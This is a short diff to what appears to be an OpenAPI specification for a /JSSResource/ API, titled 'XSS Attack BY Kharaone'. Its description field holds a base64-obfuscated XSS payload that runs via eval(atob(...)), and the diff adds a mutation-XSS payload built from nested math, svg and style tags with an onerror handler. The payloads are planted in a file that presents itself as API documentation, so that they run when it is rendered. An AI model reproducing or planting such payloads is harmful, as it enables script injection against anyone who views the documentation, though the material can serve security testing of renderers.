@@ -3,6 +3,7 @@ info:
   title: XSS Attack BY Kharaone
   description: |
     <svg></p><title><a id=\"</title><img src=x id='YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==' onerror=eval(atob(this.id))>\"></textarea></svg>
+    <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title=\"</style><img src onerror='alert(1)'>\"></style></h1>
   version: production
 basePath: /JSSResource/
 produces:
